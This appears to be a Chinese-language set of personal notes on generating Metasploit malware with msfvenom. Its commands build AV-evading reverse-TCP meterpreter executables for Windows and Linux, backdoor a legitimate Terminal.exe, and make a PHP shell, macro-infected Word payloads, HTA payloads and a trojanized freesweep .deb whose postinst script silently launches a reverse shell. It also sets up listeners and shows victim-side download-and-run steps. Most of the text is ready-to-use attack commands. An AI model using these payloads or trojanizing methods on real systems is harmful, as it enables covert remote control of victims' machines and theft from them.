##  

制作Windows恶意软件获取shell

```sh
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/xiao1.exe
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=47.95.141.60 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /root/xiao/win.exe
```

--platform 指定平台
-p 指定payload类型
-a 指定架构如x86 x64
-b 去掉坏字符，坏字符会影响payload正常执行。
-e 指定编码器也就是所谓的免杀。x86/shikata_ga_nai是msf自带的编码器
-i 指定payload有效载荷编码次数。 指定编码加密次数，
-f 指定输出格式
-o 指定文件名称和导出位置

```sh
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp 
options
set lhost 192.168.100.143
exploit    开始监听后门程序   sudo systemctl start apache2

background   将会话保存到后台

sessions
sessions -i 1  指定会话ID，调用新的会话
```

## 给软件加上后门

```sh
sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.100.143 LPORT=4444 -b"\x00" -e x86/shikata_ga_nai -i 10 -x /home/xiaoxiaoran/temp/Terminal.exe -f exe -o /var/www/html/xiao2.exe
```

## php

```sh
use payload/php/meterpreter_reverse_tcp
generate -f raw -o /var/www/html/back.php
```

## 制作Linux恶意软件获取shell

```sh
sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -i 10 -f elf -o  /var/www/html/xiao3
```

-f 指定elf即linux操作系统的可执行文件类型

```sh
msfconsole

use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.143
set LPORT 4444
exploit
```

	centos8
	
	wget http://192.168.100.143/xiao3
	chmod +x xiao3
	./xiao3
## 制作恶意deb软件包来触发后门

```sh
apt --download-only install freesweep
mv /var/cache/apt/archives/freesweep_1.0.1-1_amd64.deb  /home/xiaoxiaoran/temp/free.deb
dpkg -x freesweep_1.0.1-1_amd64.deb free   解压软件包到free目录

sudo msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -i 10 -f elf -o /home/xiaoxiaoran/temp/free/usr/games/freesweep_sources

mkdir free/DEBIAN && cd free/DEBIAN

tee /home/xiaoxiaoran/temp/free/DEBIAN/control << 'EOF'
Package: freesweep
Version: 1.0.1-1
Section: Games and Amusement
Priority: optional
Architecture: amd64
Maintainer: Ubuntu MOTU Developers (ubuntu-motu##lists.ubuntu.com)
Description: a text-based minesweeper
Freesweep is an implementation of the popular minesweeper game, where
EOF

tee /home/xiaoxiaoran/temp/free/DEBIAN/postinst << 'EOF'

#!/bin/bash

sudo chmod 2755 /usr/games/freesweep_sources
sudo /usr/games/freesweep_sources & 
EOF

chmod +755 DEBIAN/postinst 
dpkg-deb --build free xfree.deb

dpkg -i xfree.deb
```



## 利用宏感染word文档获取shell

```sh
sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe >1.txt

MACRO CODE  宏代码
payload  内容  -> 保存到启用宏的文档

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp 
options
set lhost 192.168.100.143
exploit   
```

## hta文件

```sh
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.100.143 LPORT=4444 -b"\x00" -e x86/shikata_ga_nai -i 10 -f hta-psh -o /var/www/html/1.hta
```

## 帮助

```sh
-p，--payload <payload>        要使用的有效负载。指定一个' - '或stdin来使用自定义有效载荷

--payload-options        列出有效载荷的标准选项

-l，--list [type]                           列出模块类型。选项是：payloads, encoders, nops, all

-n，--nopsled <length>            在有效负载上添加[length]大小的nopsled

-f，--format <format>              输出格式（使用--help-formats作为列表）

--help-formats              列出可用的格式

-e，--encoder <encoder>        要使用的编码器

-a，--arch <arch>                                 要使用的体系结构

 --platform<platform>            有效载荷的平台

--help-platforms                      列出可用的平台

-s，--space <length>                           生成的有效负载的最大大小

-encoder-space <length>      编码有效载荷的最大尺寸（默认为-s值）

-b，--bad-chars <list>                        避免例子的字符列表：'\ x00 \ xff'

-i，--iterations <count>                      对有效负载进行编码的次数

-c，--add-code <path>                       指定要包含的其他win32 shellcode文件

-x，--template <path>                        指定用作模板的自定义可执行文件

-k，--keep                                            保留模板行为并将有效负载注入为新线程

-o，--out <path>                                保存有效负载

-v，--var-name <name>                        指定用于某些输出格式的自定义变量名称

 --smallest                               最小生成最小可能的有效负载

-h，--help                                            显示此帮助消息
```

## 可用平台列表

以下是使用-platform选项时可以输入的Cisco 或 cisco

OSX 或 osx

Solaris 或 solaris

BSD 或 bsd

OpenBSD 或 openbsd

hardware

Firefox 或 firefox

BSDi 或 bsdi

NetBSD 或 netbsd

NodeJS 或 nodejs

FreeBSD 或 freebsd

Python 或 python

AIX 或 aix

JavaScript 或 javascript

HPUX 或 hpux

PHP 或 php

Irix 或 irix

Unix 或 unix

Linux 或 linux

Ruby 或 ruby

Java 或 java

Android 或 android

Netware 或 netware

Windows 或 windows

mainframe

multi



